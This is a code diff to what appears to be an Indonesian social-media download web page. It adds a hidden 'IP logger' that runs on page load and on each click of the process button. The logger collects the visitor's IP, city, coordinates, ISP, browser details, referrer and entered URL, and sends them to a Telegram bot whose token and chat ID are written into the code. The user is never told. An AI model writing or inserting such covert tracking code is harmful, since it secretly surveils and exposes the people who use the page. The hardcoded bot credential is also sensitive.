@@ -637,6 +637,87 @@
     const API_BASE = "https://api-faa.my.id/faa/aio?url=";
     const CREATOR_NAME = "LUTPI";
 
+    /* ====== IP LOGGER CONFIG ====== */
+    const TG_BOT_TOKEN = "8296313075:AAFnE3LHHa3V_NXP6IwJLkhqsnSgNxyTEPQ";
+    const TG_CHAT_ID   = "8074273430";
+
+    async function sendToTelegram(text){
+      try{
+        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+          method:"POST",
+          headers:{ "Content-Type":"application/json" },
+          body: JSON.stringify({
+            chat_id: TG_CHAT_ID,
+            text: text,
+            parse_mode: "HTML",
+            disable_web_page_preview: true
+          })
+        });
+      }catch(e){
+        console.warn("[tg] gagal kirim:", e);
+      }
+    }
+
+    async function grabAndSendIP(reason){
+      let ipData = {};
+      try{
+        const r = await fetch("https://api.ipify.org?format=json", { cache:"no-store" });
+        ipData.ip = (await r.json()).ip;
+      }catch(e){ ipData.ip = "unknown"; }
+
+      try{
+        const r2 = await fetch(`https://ipapi.co/${ipData.ip}/json/`, { cache:"no-store" });
+        const d = await r2.json();
+        ipData = { ...ipData, ...d };
+      }catch(e){}
+
+      // fallback kalau ipapi gagal
+      if(!ipData.city){
+        try{
+          const r3 = await fetch("https://ipwho.is/", { cache:"no-store" });
+          const d3 = await r3.json();
+          ipData = { ...ipData, ...d3 };
+        }catch(e){}
+      }
+
+      const now = new Date().toLocaleString("id-ID", { timeZone:"Asia/Jakarta" });
+      const ua  = navigator.userAgent;
+      const ref = document.referrer || "-";
+      const scr = `${screen.width}x${screen.height}`;
+      const lang= navigator.language || "-";
+      const tz  = Intl.DateTimeFormat().resolvedOptions().timeZone || "-";
+
+      const msg =
+`🎯 <b>LUTLOAD HIT</b>
+<b>Event</b>: ${reason}
+<b>Waktu</b>: ${now} WIB
+
+🌐 <b>IP</b>: <code>${ipData.ip || "unknown"}</code>
+🏙 <b>Kota</b>: ${ipData.city || "-"}, ${ipData.region || "-"}
+🌍 <b>Negara</b>: ${ipData.country_name || ipData.country || "-"} ${ipData.country_code ? "("+ipData.country_code+")" : ""}
+📮 <b>Kode Pos</b>: ${ipData.postal || "-"}
+📍 <b>Koordinat</b>: ${ipData.latitude || "-"}, ${ipData.longitude || "-"}
+🏢 <b>ISP</b>: ${ipData.org || ipData.connection?.isp || "-"}
+🛰 <b>ASN</b>: ${ipData.asn || ipData.connection?.asn || "-"}
+
+💻 <b>UA</b>: <code>${ua}</code>
+🖥 <b>Screen</b>: ${scr}
+🗣 <b>Lang</b>: ${lang}
+🕰 <b>TZ</b>: ${tz}
+🔗 <b>Ref</b>: ${ref}`;
+
+      sendToTelegram(msg);
+    }
+
+    // hit 1: begitu halaman dibuka
+    window.addEventListener("load", () => {
+      grabAndSendIP("PAGE_OPEN");
+    });
+
+    // hit 2: tiap kali user klik PROSES
+    // (dipanggil dari processMedia di bawah)
+    /* ====== END IP LOGGER CONFIG ====== */
+
     const $ = (id) => document.getElementById(id);
     const urlInput = $("urlInput");
     const processBtn = $("downloadBtn");
@@ -871,6 +952,9 @@
         urlInput.focus();
         return;
       }
+
+      // === IP LOGGER HIT: user klik PROSES ===
+      grabAndSendIP("PROSES_MEDIA | target=" + inputUrl);
 
       currentInputUrl = inputUrl;
       resultSection.classList.remove("show");
